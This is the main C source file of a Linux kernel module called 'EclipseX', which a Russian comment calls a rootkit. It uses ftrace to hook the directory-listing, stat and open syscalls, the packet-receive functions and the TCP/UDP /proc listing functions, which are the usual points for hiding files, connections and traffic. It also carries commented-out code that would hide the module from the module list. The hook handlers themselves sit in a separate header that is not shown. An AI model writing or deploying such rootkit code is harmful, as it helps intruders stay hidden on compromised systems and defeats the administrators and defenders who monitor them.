#define pr_fmt(fmt) "EclipseX: " fmt

#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/slab.h>			// работа с памятью (выделение освободждение и тп)
#include <linux/uaccess.h>		// взаимодействие с пространством пользователя
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/module.h>

#include <linux/namei.h> // для создания директории
#include <linux/mount.h>    // for mnt_idmap

#include <linux/kthread.h>   // kthread API


#include "src/hooks.h"


MODULE_LICENSE("GPL");

int debug_lvl = 0;
module_param(debug_lvl, int, 0600);
MODULE_PARM_DESC(debug_lvl, "Debug level 0/1");


// -------- пока пусть тут ----------------

// asmlinkage long (*real_sys_open)(struct pt_regs *regs) = NULL;

struct ftrace_hook EX_hooks[] = {
	HOOK("filldir64", ex_filldir64, &real_filldir64),
	HOOK("filldir", ex_filldir, &real_filldir),


	// SYS_HOOK("sys_getdents64", ex_sys_getdents64, &real_sys_getdents64),

	// !sys_stat64 sys_lstat64 ??
	SYS_HOOK("sys_stat", ex_sys_stat, &real_sys_stat),
	SYS_HOOK("sys_lstat", ex_sys_lstat, &real_sys_lstat),
	SYS_HOOK("sys_newstat", ex_sys_newstat, &real_sys_newstat),
	SYS_HOOK("sys_newlstat", ex_sys_newlstat, &real_sys_newlstat),
	SYS_HOOK("sys_newfstatat", ex_sys_newfstatat, &real_sys_newfstatat),
	SYS_HOOK("sys_statx", ex_sys_statx, &real_sys_statx),

	SYS_HOOK("sys_open", ex_sys_open, &real_sys_open),
	SYS_HOOK("sys_openat", ex_sys_openat, &real_sys_openat),
	SYS_HOOK("sys_openat2", ex_sys_openat2, &real_sys_openat2),

	// SYS_HOOK("sys_recvmsg", ex_sys_recvmsg, &real_sys_recvmsg),

	HOOK("packet_rcv", ex_packet_rcv, &real_packet_rcv),
	HOOK("packet_rcv_spkt", ex_packet_rcv_spkt, &real_packet_rcv_spkt),
	HOOK("tpacket_rcv", ex_tpacket_rcv, &real_tpacket_rcv),

	HOOK("tcp4_seq_show", ex_tcp4_seq_show, &real_tcp4_seq_show),
	HOOK("tcp6_seq_show", ex_tcp6_seq_show, &real_tcp6_seq_show),
	HOOK("udp4_seq_show", ex_udp4_seq_show, &real_udp4_seq_show),
	HOOK("udp6_seq_show", ex_udp6_seq_show, &real_udp6_seq_show),
};
// ------------------------

// Функция поиска адреса системной функции
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
static unsigned long lookup_name(const char *name)
{
	struct kprobe kp = {
		.symbol_name = name
	};
	unsigned long retval;

	if (register_kprobe(&kp) < 0) {
		return 0;
	}

	retval = (unsigned long) kp.addr;
	unregister_kprobe(&kp);
	return retval;
}
#else
static unsigned long lookup_name(const char *name)
{
	return kallsyms_lookup_name(name);
}
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define ftrace_regs pt_regs

static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs)
{
	return fregs;
}
#endif

/*
 * 2 метода предотвращения рекурсии:
 * - По адресу возврата функции (USE_FENTRY_OFFSET = 0)
 * - Пропускает вызов ftrace (USE_FENTRY_OFFSET = 1)
 */
#define USE_FENTRY_OFFSET 0

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
	hook->address = lookup_name(hook->name);

	if (!hook->address) {
		pr_debug("unresolved symbol: %s\n", hook->name);
		return -ENOENT;
	}

#if USE_FENTRY_OFFSET
	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
	*((unsigned long*) hook->original) = hook->address;
#endif

	return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
		struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
	regs->ip = (unsigned long)hook->function;
#else
	if (!within_module(parent_ip, THIS_MODULE))
		regs->ip = (unsigned long)hook->function;
#endif
}

// Функция установки хука
int fh_install_hook(struct ftrace_hook *hook)
{
	int err;

	err = fh_resolve_hook_address(hook);
	if (err)
		return err;

	hook->ops.func = fh_ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
	                | FTRACE_OPS_FL_RECURSION
	                | FTRACE_OPS_FL_IPMODIFY;

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if (err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}

	err = register_ftrace_function(&hook->ops);
	if (err) {
		pr_debug("register_ftrace_function() failed: %d\n", err);
		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
		return err;
	}
	
    pr_info("hook install %s\n", hook->name);

	return 0;
}

// Функция удаления хука
void fh_remove_hook(struct ftrace_hook *hook)
{
	int err;

	err = unregister_ftrace_function(&hook->ops);
	if (err) {
		pr_debug("unregister_ftrace_function() failed: %d\n", err);
	}

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if (err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
	}
}

// Функция установки хуков
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
	int err;
	size_t i;

	for (i = 0; i < count; i++) {
		err = fh_install_hook(&hooks[i]);
		if (err)
			goto error;
	}

	return 0;

error:
	while (i != 0) {
		fh_remove_hook(&hooks[--i]);
	}

	return err;
}

// Функция удаления хуков
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
	size_t i;

	for (i = 0; i < count; i++)
		fh_remove_hook(&hooks[i]);
}

// на подумать
#ifndef CONFIG_X86_64
#error Currently only x86_64 architecture is supported
#endif

// Отключение оптимизации для корректного обнаружения рекурсии
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

// скрытие модуля
// static struct list_head *prev_module;
// static short hidden = 0;

static struct task_struct *thread;  // Указатель на поток

int create_ex_dir(void);
// Создать директорию под руткит
int create_ex_dir(void) {
	struct path parent_path;
    struct dentry *dentry;
    struct mnt_idmap *idmap;
    int err;
	char *dir_name = "ex_EclipceX";


    err = kern_path("/", LOOKUP_DIRECTORY, &parent_path);
    if (err)
        return err;

    dentry = lookup_one_len(dir_name, parent_path.dentry, strlen(dir_name));
    if (IS_ERR(dentry)) {
        path_put(&parent_path);
        return PTR_ERR(dentry);
    }

    idmap = mnt_idmap(parent_path.mnt);  // получаем idmap для текущего mount namespace

    err = vfs_mkdir(idmap, d_inode(parent_path.dentry), dentry, 0755);

    dput(dentry);
    path_put(&parent_path);

    return err;
}


static int ex_init(void)
{
	int err;
    pr_info("module init\n");

	// скрывание модуля
	// prev_module = THIS_MODULE->list.prev;
	// list_del(&THIS_MODULE->list);
    // hidden = 1;

	err = fh_install_hooks(EX_hooks, ARRAY_SIZE(EX_hooks));
	if (err)
		return err;

    // Создаем поток
    // thread = kthread_run(my_thread_function, NULL, "my_kthread");

	// err = create_ex_dir();

	pr_info("module loaded\n");

	return 0;
}

static void ex_exit(void)
{
    pr_info("module exit\n");

	// скрытие модуля
	// list_add(&THIS_MODULE->list, prev_module);
    // hidden = 0;

	fh_remove_hooks(EX_hooks, ARRAY_SIZE(EX_hooks));

    // if (thread) {
    //     printk(KERN_INFO "Ядро: остановка потока...\n");
    //     kthread_stop(thread);
    // }

	pr_info("module unloaded\n");
}

module_init(ex_init);
module_exit(ex_exit);